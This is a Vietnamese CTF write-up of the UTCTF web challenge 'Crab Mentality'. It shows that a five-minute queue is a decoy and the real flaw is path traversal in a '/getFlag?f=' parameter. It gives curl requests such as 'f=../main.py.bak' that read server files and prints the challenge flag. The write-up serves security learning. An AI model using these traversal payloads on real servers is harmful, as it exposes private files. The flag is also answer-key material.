# Write-up: Crab Mentality (UTCTF)

## Đề bài

Challenge mô tả rằng muốn lấy flag thì phải:

- bấm nút để đăng ký lấy flag,
- chờ đúng 5 phút,
- sau đó bấm lại để nhận flag,
- nhưng nếu trong lúc mình chờ mà có team khác cũng vào hàng, thì cả hai sẽ bị hủy.

Nghe qua thì bài này giống một bài về:

- race condition,
- timing,
- tranh hàng,
- hoặc phải tìm cách canh thật chuẩn để là người duy nhất chờ đủ 5 phút.

Nhưng hướng giải thật sự lại không nằm ở chuyện “ngồi chờ”, mà là ở một lỗi **path traversal / đọc file tùy ý**.

---

## 1. Quan sát ứng dụng web

Khi bấm nút lấy flag, frontend gọi tới endpoint:

```js
fetch('/getFlag?f=flag.txt')
```

Điểm đáng chú ý là server không tự quyết định file nào sẽ trả về, mà phía client lại truyền tên file qua tham số:

```text
f=flag.txt
```

Trong web CTF, kiểu tham số như vậy rất đáng nghi vì thường dẫn đến:

- đọc file tùy ý,
- path traversal,
- lộ source code,
- hoặc lộ file backup.

Nói ngắn gọn: thay vì tập trung vào countdown 5 phút, mình nên tập trung vào tham số `f`.

---

## 2. Kiểm tra xem có path traversal không

Mình thử đổi `f=flag.txt` thành một file khác, ví dụ:

```bash
curl 'http://[url]/getFlag?f=../index.html'
```

Kết quả: server trả về luôn source code của trang chính, thay vì bắt mình chờ.

Điều này xác nhận rằng endpoint `/getFlag` bị lỗi path traversal hoặc ít nhất là cho đọc file ngoài ý muốn.

Từ đây, mình có thể tiếp tục đọc các file khác trên server.

---

## 3. Manh mối trong mã HTML

Trong source HTML của trang có comment:

```html
<!-- future: rollback old style of site + server code from backup files -->
```

Comment này là một gợi ý rất rõ rằng trên server có thể đang có:

- file backup,
- source code cũ,
- hoặc các file đuôi `.bak`.

Vì đã xác nhận đọc file được rồi, bước tiếp theo hợp lý nhất là thử lấy file backup của server.

---

## 4. Đọc file backup của server

Mình thử request:

```bash
curl 'http://[url]/getFlag?f=../main.py.bak'
```

Và server thật sự trả về nội dung file `main.py.bak`.

Nội dung như sau:

```python
import base64

_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]

_k = base64.b64decode("U2VjcmV0S2V5MTIz").decode()

_x = bytes([
    c ^ ord(_k[i % len(_k)])
    for i, c in enumerate(_d)
]).hex()

if __name__ == "__main__":
    raw = bytes(
        int(_x[i:i+2], 16) ^ ord(_k[i // 2 % len(_k)])
        for i in range(0, len(_x), 2)
    )
    print(raw.decode())
```

---

## 5. Phân tích file `main.py.bak`

Thoạt nhìn, đoạn code này có vẻ như cố làm rối bằng:

- `base64`,
- XOR với key,
- rồi lại chuyển sang hex,
- rồi XOR ngược lại lần nữa.

Nếu đọc kỹ thì sẽ thấy mảng `_d` chính là phần quan trọng nhất.

```python
_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    ...
]
```

Đây là một dãy byte ở dạng hex. Chỉ cần đổi trực tiếp sang ASCII là đã thấy flag.

Ví dụ:

- `0x75` -> `u`
- `0x74` -> `t`
- `0x66` -> `f`
- `0x6c` -> `l`
- `0x61` -> `a`
- `0x67` -> `g`
- `0x7b` -> `{`

Ghép cả mảng lại sẽ ra flag hoàn chỉnh.

Tức là phần base64/XOR bên dưới chủ yếu chỉ để làm nhiễu, khiến người đọc tưởng phải giải mã phức tạp hơn.

---

## 6. Cách lấy flag

Có thể chạy lại chính file Python đó, hoặc đơn giản hơn là decode trực tiếp mảng `_d`.

```python
d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]

print(bytes(d).decode())
```

---

## Flag

```text
utflag{y0u_e1th3r_w@1t_yr_turn_0r_cut_1n_l1ne}
```


## 7. Vì sao đây là hướng solve đúng

Bài này cố tình đánh lạc hướng người chơi sang cơ chế:

- chờ 5 phút,
- hàng đợi,
- tránh đụng team khác,
- “mọi người cùng chờ thì mới có flag”.

Nhưng thực tế lỗ hổng nằm ở endpoint:

```text
/getFlag?f=...
```

Vì có thể sửa giá trị `f`, mình không cần chơi đúng luật của queue nữa. Chỉ cần:

1. phát hiện tham số `f` khả nghi,
2. thử path traversal,
3. đọc source HTML,
4. thấy comment nhắc tới backup,
5. lấy `../main.py.bak`,
6. đọc mảng byte và lấy flag.

---

## 8. Kết luận

Ý chính của bài:

- Frontend dựng lên một câu chuyện về queue 5 phút để đánh lạc hướng.
- Lỗi thật là **path traversal / file disclosure** ở tham số `f`.
- Từ đó có thể đọc được file backup `main.py.bak`.
- Trong file backup, flag nằm sẵn trong mảng `_d`.
- Decode trực tiếp mảng đó là ra flag.

